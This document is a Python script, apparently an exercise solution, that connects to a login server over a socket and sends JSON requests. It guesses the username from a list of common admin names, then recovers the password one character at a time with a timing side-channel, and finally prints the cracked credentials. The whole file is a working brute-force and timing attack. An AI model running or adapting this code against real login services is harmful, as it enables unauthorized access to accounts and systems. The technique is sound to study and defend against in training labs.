import sys
import socket
import string
import json
import time
# import itertools


def send_message():
    message_to_send = json.dumps(data, indent=4)
    message_to_send = message_to_send.encode()
    current_socket.send(message_to_send)


def receive_message():
    response_recv = current_socket.recv(1024)
    response_recv = response_recv.decode()
    response_recv = json.loads(response_recv)
    return response_recv


args = sys.argv
hostname = args[1]
port = int(args[2])
address = (hostname, port)

current_socket = socket.socket()
current_socket.connect(address)

library = dict()
for i in string.ascii_lowercase:
    library[i] = [i.upper(), i]

string_check = string.ascii_lowercase + string.ascii_uppercase + string.digits
data = {'login': '', 'password': ''}
login_list = ['admin', 'Admin', 'admin1', 'admin2', 'admin3', 'user1', 'user2', 'root', 'default', 'new_user',
              'some_user', 'new_admin', 'administrator', 'Administrator', 'superuser', 'super', 'su', 'alex', 'suser',
              'rootuser', 'adminadmin', 'useruser', 'superadmin', 'username', 'username1']

response = dict()
response['result'] = ''

for login in login_list:
    data['login'] = login
    send_message()
    start_delay = time.perf_counter()
    response = receive_message()
    stop_delay = time.perf_counter()
    if stop_delay - start_delay > 0.01:
        break

check = ''
while True:
    for symbol in string_check:
        data['password'] = check + symbol
        send_message()
        start_delay = time.perf_counter()
        response = receive_message()
        stop_delay = time.perf_counter()
        if stop_delay - start_delay > 0.01:
            check += symbol
            break
        if response['result'] == 'Connection success!':
            break
    if response['result'] == 'Connection success!':
        break

print(json.dumps(data))
current_socket.close()
